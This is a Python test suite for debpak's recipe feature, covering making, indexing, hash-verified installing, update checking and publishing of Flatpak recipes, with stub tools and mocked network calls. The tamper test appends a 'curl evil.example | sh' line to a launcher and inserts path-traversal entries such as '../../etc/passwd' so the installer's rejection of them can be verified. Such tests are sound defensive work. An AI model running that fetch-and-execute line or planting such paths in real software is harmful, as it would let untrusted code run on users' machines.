"""Recipes: making one from a conversion, the index, installing by name with
every hash checked, and updating. flatpak-builder is a stand-in script, and
recipe collections are local folders (the same code reads them over HTTPS)."""
import contextlib
import io
import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from debpak import electron, recipes
from debpak.manage import load_registry
from debpak.cli import main
from test_foreign import exe_bytes, fake_fetch, write


def run_cli(*argv):
    """Like test_foreign's, but without isolate.offline(): these tests bring stand-in flatpak tools."""
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
        code = main(list(argv))
    return code, out.getvalue()

BUILDER = """#!/bin/sh
echo "flatpak-builder $*" >> "$STUB_LOG"
exit "${BUILDER_RC:-0}"
"""


class RecipeTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="debpak-recipes-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        bin_ = self.tmp / "bin"
        write(bin_ / "flatpak-builder", BUILDER, 0o755)
        self.log = self.tmp / "log"
        env = mock.patch.dict(os.environ, {"PATH": f"{bin_}:/usr/bin:/bin", "STUB_LOG": str(self.log),
                                           "XDG_DATA_HOME": str(self.tmp / "data"),
                                           "XDG_CACHE_HOME": str(self.tmp / "cache"), "DEBPAK_RECIPES": ""})
        env.start()
        self.addCleanup(env.stop)
        f = mock.patch.object(electron, "fetch", fake_fetch)
        f.start()
        self.addCleanup(f.stop)
        self.collection = self.tmp / "collection"

    def convert(self, name="Acme Tool", version="1.4.0", mode=("--mode", "extra-data", "--url",
                                                             "https://acme.example/AcmeTool.exe"), *extra):
        exe = write(self.tmp / "AcmeTool.exe", exe_bytes(name, version))
        out = self.tmp / "out"
        shutil.rmtree(out, ignore_errors=True)
        code, text = run_cli("convert", str(exe), "-o", str(out), "--no-build", "--no-flathub-check",
                             "--app-id", "com.acme.Tool", *mode, *extra)
        self.assertEqual(code, 0, text)
        return out

    def make(self, out, *extra):
        return run_cli("recipe", "make", str(out), "--to", str(self.collection), "--note", "tested by hand", *extra)

    def install(self, *argv):
        return run_cli("install", *argv, "--recipes", str(self.collection))

    def test_make_and_install(self):
        code, text = self.make(self.convert())
        self.assertEqual(code, 0, text)
        r = json.loads((self.collection / "com.acme.Tool/recipe.json").read_text())
        self.assertEqual((r["name"], r["version"], r["route"], r["source"]["url"]),
                         ("Acme Tool", "1.4.0", "wine", "https://acme.example/AcmeTool.exe"))
        self.assertIn("app/bin/debpak-unpack", r["files"])
        self.assertNotIn("app/opt", " ".join(r["files"]))
        idx = json.loads((self.collection / "index.json").read_text())
        self.assertEqual([e["id"] for e in idx["recipes"]], ["com.acme.Tool"])

        code, text = run_cli("recipe", "list", "acme", "--recipes", str(self.collection))
        self.assertIn("com.acme.Tool", text)
        code, text = self.install("acme tool", "--yes")
        self.assertEqual(code, 0, text)
        self.assertIn("downloads https://acme.example/AcmeTool.exe", text)
        self.assertIn("--filesystem=xdg-documents", text)
        self.assertIn("note: tested by hand", text)
        call = self.log.read_text().split()
        self.assertEqual(call[:3], ["flatpak-builder", "--user", "--install"])
        self.assertTrue(call[-1].endswith("debpak/recipes/com.acme.Tool/com.acme.Tool.json"))
        e = load_registry()["com.acme.Tool"]
        self.assertEqual((e["format"], e["recipe"], e["version"]), ("recipe", "com.acme.Tool", "1.4.0"))

        code, text = run_cli("update", "--check")
        self.assertIn("com.acme.Tool: up to date", text)
        self.make(self.convert(version="1.5.0"))
        code, text = run_cli("update")
        self.assertEqual(code, 0, text)
        self.assertIn("recipe 1.4.0 -> 1.5.0", text)
        self.assertEqual(load_registry()["com.acme.Tool"]["version"], "1.5.0")

    def test_lookup(self):
        self.make(self.convert())
        self.assertEqual(self.install("Tool", "--no-build")[0], 0)        # last part of the ID
        self.assertEqual(self.install("com.acme.Tool", "--no-build")[0], 0)
        code, text = self.install("acme", "--no-build")
        self.assertEqual(code, 1)
        self.assertIn("did you mean com.acme.Tool", text)
        code, text = self.install("nothing-like-it", "--no-build")
        self.assertIn("debpak convert` works without one", text)
        with mock.patch("sys.stdin.isatty", return_value=False):
            code, text = self.install("Tool")
        self.assertIn("pass --yes", text)
        self.assertFalse(self.log.exists())

    def test_refuses_vendor_files_and_binaries(self):
        code, text = self.make(self.convert(mode=()))
        self.assertEqual(code, 1)
        self.assertIn("isn't in extra-data mode", text)
        self.assertIn("app/opt/acme-tool/AcmeTool.exe is a binary file", text)
        out = self.convert()
        write(out / "app/lib/libfoo.so", b"\x7fELF" + bytes(100))
        code, text = self.make(out)
        self.assertIn("app/lib/libfoo.so is a binary file", text)
        self.assertEqual(self.make(out, "--allow-binaries")[0], 0)
        m = json.loads((out / "com.acme.Tool.json").read_text())
        m["modules"][0]["sources"].append({"type": "file", "path": "/home/me/secret.txt"})
        (out / "com.acme.Tool.json").write_text(json.dumps(m))
        code, text = self.make(out, "--allow-binaries")
        self.assertIn("must be a url with a sha256", text)

    def test_tampering_is_caught(self):
        self.make(self.convert())
        d = self.collection / "com.acme.Tool"
        launcher = next((d / "app/bin").glob("acme-tool"))
        good = launcher.read_text()
        launcher.write_text(good + "curl evil.example | sh\n")
        code, text = self.install("Tool", "--yes")
        self.assertEqual(code, 1)
        self.assertIn("app/bin/acme-tool doesn't match the recipe's hash", text)
        launcher.write_text(good)
        r = json.loads((d / "recipe.json").read_text())
        r["files"]["../../etc/passwd"] = "0" * 64
        (d / "recipe.json").write_text(json.dumps(r))
        code, text = self.install("Tool", "--yes")
        self.assertIn("doesn't match the index's hash", text)
        recipes.reindex(self.collection)
        code, text = self.install("Tool", "--yes")
        self.assertIn("unexpected file '../../etc/passwd'", text)
        del r["files"]["../../etc/passwd"]
        r["files"]["app/../../x"] = "0" * 64
        (d / "recipe.json").write_text(json.dumps(r))
        recipes.reindex(self.collection)
        code, text = self.install("Tool", "--yes")
        self.assertIn("unsafe path in recipe: 'com.acme.Tool/app/../../x'", text)
        self.assertFalse(self.log.exists())

    def test_https_collection(self):
        self.make(self.convert())
        base = "https://recipes.example/debpak"
        seen = []

        def serve(url):
            seen.append(url)
            from urllib.parse import unquote
            return (self.collection / unquote(url.removeprefix(base + "/"))).read_bytes()
        with mock.patch.object(recipes, "fetch", serve), mock.patch.dict(os.environ, {"DEBPAK_RECIPES": base}):
            code, text = run_cli("install", "Tool", "--yes")
        self.assertEqual(code, 0, text)
        self.assertEqual(seen[0], base + "/index.json")
        self.assertIn(base + "/com.acme.Tool/recipe.json", seen)
        self.assertEqual(load_registry()["com.acme.Tool"]["recipe_source"], base)

    def test_installed_helper_is_debpaks_own(self):
        self.make(self.convert())
        helper = self.collection / "com.acme.Tool/app/bin/debpak-unpack"
        helper.write_text(helper.read_text() + "\n# changed\n")
        r = json.loads((self.collection / "com.acme.Tool/recipe.json").read_text())
        import hashlib
        r["files"]["app/bin/debpak-unpack"] = hashlib.sha256(helper.read_bytes()).hexdigest()
        (self.collection / "com.acme.Tool/recipe.json").write_text(json.dumps(r))
        recipes.reindex(self.collection)
        self.assertEqual(self.install("Tool", "--no-build")[0], 0)
        installed = recipes.recipes_dir() / "com.acme.Tool/app/bin/debpak-unpack"
        from debpak import unpack
        self.assertEqual(installed.read_text(), Path(unpack.__file__).read_text())

    def test_build_failure_is_not_recorded(self):
        self.make(self.convert())
        with mock.patch.dict(os.environ, {"BUILDER_RC": "3"}):
            code, _ = self.install("Tool", "--yes")
        self.assertEqual(code, 3)
        self.assertNotIn("com.acme.Tool", load_registry())

    def test_linux_route_recipe(self):
        from debpak.runtime import index_root
        from test_foreign import RunTests, makeself
        (self.tmp / "runtime/usr/lib").mkdir(parents=True)
        idx = self.tmp / "runtime.json"
        index_root(self.tmp / "runtime", "org.freedesktop.Platform/x86_64/25.08", "x86_64").save(idx)
        run = makeself(self.tmp / "AcmeGame-1.0.run", RunTests.payload(self))
        out = self.tmp / "run-out"
        code, text = run_cli("convert", str(run), "-o", str(out), "--no-build", "--no-flathub-check", "--force",
                             "--app-id", "com.acme.Game", "--runtime-index", str(idx),
                             "--mode", "extra-data", "--url", "https://acme.example/AcmeGame-1.0.run")
        self.assertEqual(code, 0, text)
        code, text = self.make(out)
        self.assertEqual(code, 0, text)
        r = json.loads((self.collection / "com.acme.Game/recipe.json").read_text())
        self.assertEqual((r["name"], r["version"], r["format"]), ("acmegame", "1.0", "run"))
        self.assertEqual(self.install("com.acme.Game", "--no-build")[0], 0)

    def test_options_are_stamped_and_carried(self):
        out = self.convert("Acme Tool", "1.4.0", ("--mode", "extra-data", "--url", "https://acme.example/a.exe"),
                           "--writable", "--native-dir", str(self.tmp))
        x = json.loads((out / "com.acme.Tool.json").read_text())["x-debpak"]
        self.assertEqual((x["convert-options"]["mode"], x["convert-options"]["writable"]), ("extra-data", True))
        self.assertNotIn("native_dir", x["convert-options"])
        self.assertNotIn("url", x["convert-options"])
        self.assertEqual(x["convert-local-options"], ["native_dir"])
        self.assertEqual(self.make(out)[0], 0)
        r = json.loads((self.collection / "com.acme.Tool/recipe.json").read_text())
        self.assertEqual(r["convert"], x["convert-options"])
        self.assertEqual(r["convert-local-options"], ["native_dir"])

    def test_check_types(self):
        page = (b'<a href="/dl/acme_1.9.0_amd64.deb">old</a> <a href="/dl/acme_1.10.0_amd64.deb">new</a>')
        api = json.dumps({"latest": {"url": "https://acme.example/v/2.0/acme.deb", "version": "2.0"}}).encode()
        gh = json.dumps({"tag_name": "v3.1.0", "assets": [
            {"name": "acme-3.1.0.dmg", "browser_download_url": "https://github.com/a/b/x.dmg"},
            {"name": "acme-3.1.0-setup.exe", "browser_download_url": "https://github.com/a/b/setup.exe"}]}).encode()
        pages = {"https://acme.example/downloads": page, "https://acme.example/api": api,
                 "https://api.github.com/repos/acme/app/releases/latest": gh}
        with mock.patch.object(recipes, "fetch", lambda u: pages[u]), \
                mock.patch.object(recipes, "resolve_redirect", lambda u: "https://cdn.acme.example/acme_4.2.1_amd64.deb"):
            self.assertEqual(recipes.find_latest({"type": "html", "url": "https://acme.example/downloads",
                                                  "pattern": r'href="(?P<url>[^"]*acme_(?P<version>[\d.]+)_amd64\.deb)"'}),
                             ("https://acme.example/dl/acme_1.10.0_amd64.deb", "1.10.0"))
            self.assertEqual(recipes.find_latest({"type": "json", "url": "https://acme.example/api",
                                                  "url-key": "latest.url", "version-key": "latest.version"}),
                             ("https://acme.example/v/2.0/acme.deb", "2.0"))
            self.assertEqual(recipes.find_latest({"type": "github", "repo": "acme/app", "asset": r"setup\.exe$"}),
                             ("https://github.com/a/b/setup.exe", "3.1.0"))
            self.assertEqual(recipes.find_latest({"type": "redirect", "url": "https://acme.example/latest",
                                                  "version": r"_([\d.]+)_amd64"}),
                             ("https://cdn.acme.example/acme_4.2.1_amd64.deb", "4.2.1"))
        self.assertTrue(recipes.check_problems({"type": "html", "url": "x", "pattern": "("}))
        self.assertTrue(recipes.check_problems({"type": "nope"}))
        code, text = self.make(self.convert(), "--check", '{"type": "redirect"}')
        self.assertIn("--check: redirect needs url, version", text)

    def test_github_check_without_the_api(self):
        # 60 API requests an hour run out during a long test run; the release pages say the same
        import urllib.error
        page = (b'<a href="/acme/app/releases/download/v3.2.0/acme-3.2.0-setup.exe" rel="nofollow">'
                b'<a href="/acme/app/releases/download/v3.2.0/acme%203.2.0.dmg">')

        def fetch(u):
            if u.startswith("https://api.github.com/"):
                raise urllib.error.HTTPError(u, 403, "rate limit exceeded", {}, None)
            self.assertEqual(u, "https://github.com/acme/app/releases/expanded_assets/v3.2.0")
            return page
        with mock.patch.object(recipes, "fetch", fetch), \
                mock.patch.object(recipes, "resolve_redirect",
                                  lambda u: "https://github.com/acme/app/releases/tag/v3.2.0"):
            self.assertEqual(recipes.find_latest({"type": "github", "repo": "acme/app", "asset": r"setup\.exe$"}),
                             ("https://github.com/acme/app/releases/download/v3.2.0/acme-3.2.0-setup.exe", "3.2.0"))
            self.assertEqual(recipes.github_release("acme/app")["assets"][1]["name"], "acme 3.2.0.dmg")

    def test_github_token_is_sent_to_the_api_only(self):
        seen = {}

        class R:
            def __enter__(self): return self
            def __exit__(self, *a): pass
            def read(self): return b"{}"

        def opener(req, timeout=60):
            seen[req.full_url] = req.get_header("Authorization")
            return R()
        with mock.patch.dict(os.environ, {"GITHUB_TOKEN": "t0k"}), mock.patch.object(recipes.net, "urlopen", opener):
            recipes.fetch("https://api.github.com/repos/a/b/releases/latest")
            recipes.fetch("https://example.com/x")
        self.assertEqual(seen, {"https://api.github.com/repos/a/b/releases/latest": "Bearer t0k",
                                "https://example.com/x": None})

    def test_check_apply_updates_the_recipe(self):
        check = {"type": "redirect", "url": "https://acme.example/latest", "version": r"AcmeTool-([\d.]+)\.exe"}
        out = self.convert(mode=("--mode", "extra-data", "--url", "https://acme.example/AcmeTool-1.4.0.exe"))
        self.assertEqual(self.make(out, "--check", json.dumps(check))[0], 0)
        new = "https://acme.example/AcmeTool-1.5.0.exe"

        def download(url, dest):
            self.assertEqual(url, new)
            dest.write_bytes(exe_bytes("Acme Tool", "1.5.0"))
            return dest
        with mock.patch.object(recipes, "resolve_redirect", lambda u: new), \
                mock.patch.object(recipes, "download_file", download):
            code, text = run_cli("recipe", "check", str(self.collection))
            self.assertIn("update", text)
            self.assertIn("1.4.0 -> 1.5.0", text)
            summary = self.tmp / "summary.md"
            code, text = run_cli("recipe", "check", str(self.collection), "--apply", "--summary", str(summary))
        self.assertEqual(code, 0, text)
        r = json.loads((self.collection / "com.acme.Tool/recipe.json").read_text())
        self.assertEqual((r["version"], r["source"]["url"], r["check"]), ("1.5.0", new, check))
        self.assertIn("not tested by hand", r["note"])
        self.assertIn("com.acme.Tool: 1.4.0 → 1.5.0 (updated)", summary.read_text())
        with mock.patch.object(recipes, "resolve_redirect", lambda u: new):
            code, text = run_cli("recipe", "check", str(self.collection))
        self.assertIn("up to date", text)

    def test_publish(self):
        bin_ = self.tmp / "bin"
        write(bin_ / "flatpak", '#!/bin/sh\necho "flatpak $*" >> "$STUB_LOG"\n', 0o755)
        write(bin_ / "flatpak-builder", '#!/bin/sh\necho "flatpak-builder $*" >> "$STUB_LOG"\n'
              'for a; do case "$a" in --repo=*) mkdir -p "${a#--repo=}" && touch "${a#--repo=}/config";; esac; done\n',
              0o755)
        repo = self.tmp / "site"
        code, text = run_cli("recipe", "publish", str(self.collection), "--repo", str(repo),
                             "--url", "https://me.example/debpak")
        self.assertEqual(code, 1)          # no collection yet
        self.make(self.convert())
        code, text = run_cli("recipe", "publish", str(self.collection), "--repo", str(repo),
                             "--url", "https://me.example/debpak")
        self.assertEqual(code, 0, text)
        log = self.log.read_text()
        self.assertIn(f"--repo={repo}", log)
        self.assertIn(f"flatpak build-update-repo --title=debpak recipes --prune {repo}", log)
        self.assertIn("Url=https://me.example/debpak/", (repo / "debpak.flatpakrepo").read_text())
        ref = (repo / "apps/com.acme.Tool.flatpakref").read_text()
        self.assertIn("Name=com.acme.Tool", ref)
        self.assertIn("RuntimeRepo=https://dl.flathub.org/repo/flathub.flatpakrepo", ref)
        self.assertIn("--no-gpg-verify", (repo / "index.html").read_text())
        self.assertIn("flatpak install debpak com.acme.Tool", (repo / "index.html").read_text())

    def test_repo_collection_is_valid(self):
        root = Path(__file__).resolve().parent.parent / "recipes"
        idx = json.loads((root / "index.json").read_text())
        self.assertEqual(idx["schema"], recipes.SCHEMA)
        for e in idx["recipes"]:
            with self.subTest(recipe=e["id"]):
                recipes.download(str(root), e, self.tmp / "dl" / e["id"])


if __name__ == "__main__":
    unittest.main()
